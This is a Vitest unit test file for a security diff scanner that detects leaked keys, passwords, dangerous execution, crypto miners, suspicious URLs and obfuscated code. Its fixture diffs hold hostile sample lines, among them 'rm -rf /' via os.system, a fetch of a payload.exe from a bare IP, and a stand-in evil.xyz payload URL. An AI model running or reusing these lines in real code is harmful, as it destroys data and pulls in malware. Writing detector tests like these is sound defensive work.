/**
 * Unit tests for src/security/diff-scanner.ts — Pattern detection engine.
 */
import { describe, expect, it, beforeEach, afterEach, vi } from 'vitest';

vi.mock('../../utils/logger.js', () => ({
  rootLogger: { child: vi.fn(() => ({ info: vi.fn(), warn: vi.fn(), error: vi.fn(), debug: vi.fn() })) },
}));

// We need to mock fs operations for false-positive loading
import { resetFalsePositivePatterns } from '../../security/diff-scanner.js';

describe('security/diff-scanner', () => {
  let scanner: typeof import('../../security/diff-scanner.js');

  beforeEach(async () => {
    vi.clearAllMocks();
    resetFalsePositivePatterns();
    scanner = await import('../../security/diff-scanner.js');
  });

  afterEach(() => {
    resetFalsePositivePatterns();
  });

  // ── parseDiff ─────────────────────────────────────────────────────

  describe('parseDiff', () => {
    it('parses a unified diff into hunks', () => {
      const diff = [
        'diff --git a/src/file1.ts b/src/file1.ts',
        'index abc..def 100644',
        '--- a/src/file1.ts',
        '+++ b/src/file1.ts',
        '@@ -10,7 +10,8 @@',
        ' context line',
        '+added line 1',
        '+added line 2',
        ' context after',
        '',
        'diff --git a/src/file2.ts b/src/file2.ts',
        'index 123..456 100644',
        '--- a/src/file2.ts',
        '+++ b/src/file2.ts',
        '@@ -1,3 +1,5 @@',
        '+new line',
        ' existing',
        '+another new',
      ].join('\n');

      const hunks = scanner.parseDiff(diff);
      expect(hunks).toHaveLength(2);
      expect(hunks[0].file).toBe('src/file1.ts');
      expect(hunks[0].startLine).toBe(10);
      expect(hunks[1].file).toBe('src/file2.ts');
      expect(hunks[1].startLine).toBe(1);
    });

    it('returns empty array for empty diff', () => {
      expect(scanner.parseDiff('')).toEqual([]);
    });

    it('returns empty array for diff with no hunks', () => {
      const diff = 'diff --git a/file b/file\nindex abc..def 100644\n--- a/file\n+++ b/file\n';
      expect(scanner.parseDiff(diff)).toEqual([]);
    });
  });

  // ── scanDiff — API Keys & Secrets ─────────────────────────────────

  describe('scanDiff — API Keys', () => {
    it('detects exposed API keys in diff', () => {
      const diff = [
        'diff --git a/src/config.ts b/src/config.ts',
        'index abc..def 100644',
        '--- a/src/config.ts',
        '+++ b/src/config.ts',
        '@@ -1,5 +1,6 @@',
        ' const API_KEY = "sk-123456789012345678901234";',
      ].join('\n');

      const results = scanner.scanDiff(diff);
      const apiKeyFindings = results.filter((r) => r.type === 'api-key');
      expect(apiKeyFindings.length).toBeGreaterThanOrEqual(1);
    });

    it('detects AWS access keys', () => {
      const diff = [
        'diff --git a/src/aws.ts b/src/aws.ts',
        'index abc..def 100644',
        '--- a/src/aws.ts',
        '+++ b/src/aws.ts',
        '@@ -1,3 +1,4 @@',
        '+const awsKey = "AKIAIOSFODNN7EXAMPLE";',
      ].join('\n');

      const results = scanner.scanDiff(diff);
      expect(results.some((r) => r.type === 'aws-key')).toBe(true);
    });

    it('detects GitHub tokens', () => {
      const diff = [
        'diff --git a/src/deploy.ts b/src/deploy.ts',
        'index abc..def 100644',
        '--- a/src/deploy.ts',
        '+++ b/src/deploy.ts',
        '@@ -5,6 +5,7 @@',
        '+const token = "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";',
      ].join('\n');

      const results = scanner.scanDiff(diff);
      expect(results.some((r) => r.type === 'github-token')).toBe(true);
    });

    it('detects private keys', () => {
      const diff = [
        'diff --git a/src/key.pem b/src/key.pem',
        'index abc..def 100644',
        '--- a/src/key.pem',
        '+++ b/src/key.pem',
        '@@ -1,3 +1,4 @@',
        '+-----BEGIN RSA PRIVATE KEY-----',
      ].join('\n');

      const results = scanner.scanDiff(diff);
      expect(results.some((r) => r.type === 'private-key')).toBe(true);
    });

    it('detects connection strings', () => {
      const diff = [
        'diff --git a/src/db.ts b/src/db.ts',
        'index abc..def 100644',
        '--- a/src/db.ts',
        '+++ b/src/db.ts',
        '@@ -1,3 +1,4 @@',
        '+const db = "mongodb://user:pass@localhost:27017/mydb";',
      ].join('\n');

      const results = scanner.scanDiff(diff);
      expect(results.some((r) => r.type === 'connection-string')).toBe(true);
    });

    it('detects hardcoded passwords', () => {
      const diff = [
        'diff --git a/src/auth.ts b/src/auth.ts',
        'index abc..def 100644',
        '--- a/src/auth.ts',
        '+++ b/src/auth.ts',
        '@@ -1,3 +1,4 @@',
        '+const password = "supersecret123!";',
      ].join('\n');

      const results = scanner.scanDiff(diff);
      expect(results.some((r) => r.type === 'password')).toBe(true);
    });
  });

  // ── scanDiff — Dangerous Code Execution ───────────────────────────

  describe('scanDiff — dangerous code execution', () => {
    it('detects os.system() usage', () => {
      const diff = [
        'diff --git a/src/exec.ts b/src/exec.ts',
        'index abc..def 100644',
        '--- a/src/exec.ts',
        '+++ b/src/exec.ts',
        '@@ -1,3 +1,4 @@',
        '+os.system("rm -rf /");',
      ].join('\n');

      const results = scanner.scanDiff(diff);
      expect(results.some((r) => r.type === 'code-execution')).toBe(true);
    });

    it('detects eval() usage', () => {
      const diff = [
        'diff --git a/src/eval.ts b/src/eval.ts',
        'index abc..def 100644',
        '--- a/src/eval.ts',
        '+++ b/src/eval.ts',
        '@@ -1,3 +1,4 @@',
        '+eval("process.exit()");',
      ].join('\n');

      const results = scanner.scanDiff(diff);
      expect(results.some((r) => r.type === 'eval-usage')).toBe(true);
    });

    it('detects dangerous Node.js modules', () => {
      const diff = [
        'diff --git a/src/hack.ts b/src/hack.ts',
        'index abc..def 100644',
        '--- a/src/hack.ts',
        '+++ b/src/hack.ts',
        '@@ -1,3 +1,4 @@',
        '+const cp = require("child_process");',
      ].join('\n');

      const results = scanner.scanDiff(diff);
      expect(results.some((r) => r.type === 'dangerous-node-module')).toBe(true);
    });

    it('detects dangerous imports', () => {
      const diff = [
        'diff --git a/src/hack.py b/src/hack.py',
        'index abc..def 100644',
        '--- a/src/hack.py',
        '+++ b/src/hack.py',
        '@@ -1,3 +1,4 @@',
        '+import subprocess',
      ].join('\n');

      const results = scanner.scanDiff(diff);
      expect(results.some((r) => r.type === 'dangerous-import')).toBe(true);
    });
  });

  // ── scanDiff — Crypto Miners & Network ────────────────────────────

  describe('scanDiff — crypto miners and suspicious network calls', () => {
    it('detects crypto miner references', () => {
      const diff = [
        'diff --git a/src/mine.ts b/src/mine.ts',
        'index abc..def 100644',
        '--- a/src/mine.ts',
        '+++ b/src/mine.ts',
        '@@ -1,3 +1,4 @@',
        '+const miner = new CryptoNight();',
      ].join('\n');

      const results = scanner.scanDiff(diff);
      expect(results.some((r) => r.type === 'crypto-miner')).toBe(true);
    });

    it('detects suspicious IP-based URLs', () => {
      const diff = [
        'diff --git a/src/malware.ts b/src/malware.ts',
        'index abc..def 100644',
        '--- a/src/malware.ts',
        '+++ b/src/malware.ts',
        '@@ -1,3 +1,4 @@',
        '+fetch("http://192.168.1.100/payload.exe");',
      ].join('\n');

      const results = scanner.scanDiff(diff);
      expect(results.some((r) => r.type === 'suspicious-url')).toBe(true);
    });

    it('detects suspicious TLD domains', () => {
      const diff = [
        'diff --git a/src/callback.ts b/src/callback.ts',
        'index abc..def 100644',
        '--- a/src/callback.ts',
        '+++ b/src/callback.ts',
        '@@ -1,3 +1,4 @@',
        '+const url = "https://evil.xyz/payload";',
      ].join('\n');

      const results = scanner.scanDiff(diff);
      expect(results.some((r) => r.type === 'suspicious-domain')).toBe(true);
    });
  });

  // ── scanDiff — Obfuscated Code ────────────────────────────────────

  describe('scanDiff — obfuscated code', () => {
    it('detects base64-encoded payloads', () => {
      const diff = [
        'diff --git a/src/obfuscated.ts b/src/obfuscated.ts',
        'index abc..def 100644',
        '--- a/src/obfuscated.ts',
        '+++ b/src/obfuscated.ts',
        '@@ -1,3 +1,4 @@',
        '+const payload = "SGVsbG8gVGhpcyBpcyBhIGJhc2U2NCBlbmNvZGVkIHN0cmluZw==";',
      ].join('\n');

      const results = scanner.scanDiff(diff);
      const base64Findings = results.filter((r) => r.type === 'base64-encoded');
      expect(base64Findings.length).toBeGreaterThanOrEqual(1);
    });

    it('detects obfuscated JS strings', () => {
      const diff = [
        'diff --git a/src/obfuscated.ts b/src/obfuscated.ts',
        'index abc..def 100644',
        '--- a/src/obfuscated.ts',
        '+++ b/src/obfuscated.ts',
        '@@ -1,3 +1,4 @@',
        '+const code = String.fromCharCode(72,101,108,108,111);',
      ].join('\n');

      const results = scanner.scanDiff(diff);
      expect(results.some((r) => r.type === 'obfuscated-string')).toBe(true);
    });
  });

  // ── scanDiff — Commented-out Code ──────────────────────────────────

  describe('scanDiff — commented-out code', () => {
    it('detects commented-out imports', () => {
      const diff = [
        'diff --git a/src/cleanup.ts b/src/cleanup.ts',
        'index abc..def 100644',
        '--- a/src/cleanup.ts',
        '+++ b/src/cleanup.ts',
        '@@ -1,3 +1,4 @@',
        '+// import fs from "fs";',
      ].join('\n');

      const results = scanner.scanDiff(diff);
      expect(results.some((r) => r.type === 'commented-code')).toBe(true);
    });
  });

  // ── Severity blocking ─────────────────────────────────────────────

  describe('severity blocking behavior', () => {
    it('HIGH findings block PR creation', () => {
      const results: import('../../security/diff-scanner.js').ScanResult[] = [
        { severity: 'HIGH', type: 'api-key', file: 'test.ts', line: 1, message: 'API key' },
      ];
      expect(scanner.hasBlockingFindings(results)).toBe(true);
    });

    it('LOW findings do not block PR creation', () => {
      const results: import('../../security/diff-scanner.js').ScanResult[] = [
        { severity: 'LOW', type: 'commented-code', file: 'test.ts', line: 1, message: 'Comment' },
      ];
      expect(scanner.hasBlockingFindings(results)).toBe(false);
    });

    it('mixed severity only blocks on HIGH', () => {
      const results: import('../../security/diff-scanner.js').ScanResult[] = [
        { severity: 'LOW', type: 'commented-code', file: 'test.ts', line: 1, message: 'Comment' },
        { severity: 'MEDIUM', type: 'base64-encoded', file: 'test.ts', line: 2, message: 'Base64' },
      ];
      expect(scanner.hasBlockingFindings(results)).toBe(false);
    });
  });

  // ── groupBySeverity ───────────────────────────────────────────────

  describe('groupBySeverity', () => {
    it('groups results by severity', () => {
      const results: import('../../security/diff-scanner.js').ScanResult[] = [
        { severity: 'HIGH', type: 'api-key', file: 'a.ts', line: 1, message: 'API key' },
        { severity: 'MEDIUM', type: 'base64-encoded', file: 'b.ts', line: 2, message: 'Base64' },
        { severity: 'LOW', type: 'commented-code', file: 'c.ts', line: 3, message: 'Comment' },
        { severity: 'HIGH', type: 'password', file: 'a.ts', line: 4, message: 'Password' },
      ];

      const grouped = scanner.groupBySeverity(results);
      expect(grouped.HIGH).toHaveLength(2);
      expect(grouped.MEDIUM).toHaveLength(1);
      expect(grouped.LOW).toHaveLength(1);
    });
  });

  // ── Empty diff ────────────────────────────────────────────────────

  describe('empty diff handling', () => {
    it('returns empty array for empty diff', () => {
      expect(scanner.scanDiff('')).toEqual([]);
    });

    it('returns empty array for whitespace-only diff', () => {
      expect(scanner.scanDiff('   \n\n  ')).toEqual([]);
    });
  });

  // ── scanDiff — no false positive on safe code ──────────────────

  describe('false positives', () => {
    it('does not flag normal code', () => {
      const diff = [
        'diff --git a/src/normal.ts b/src/normal.ts',
        'index abc..def 100644',
        '--- a/src/normal.ts',
        '+++ b/src/normal.ts',
        '@@ -1,3 +1,4 @@',
        '+const greeting = "Hello, world!";',
        '+const port = 3000;',
        '+export function sum(a: number, b: number) { return a + b; }',
      ].join('\n');

      const results = scanner.scanDiff(diff);
      // Normal code should generate zero or very few findings
      const highFindings = results.filter((r) => r.severity === 'HIGH');
      expect(highFindings).toHaveLength(0);
    });
  });
});
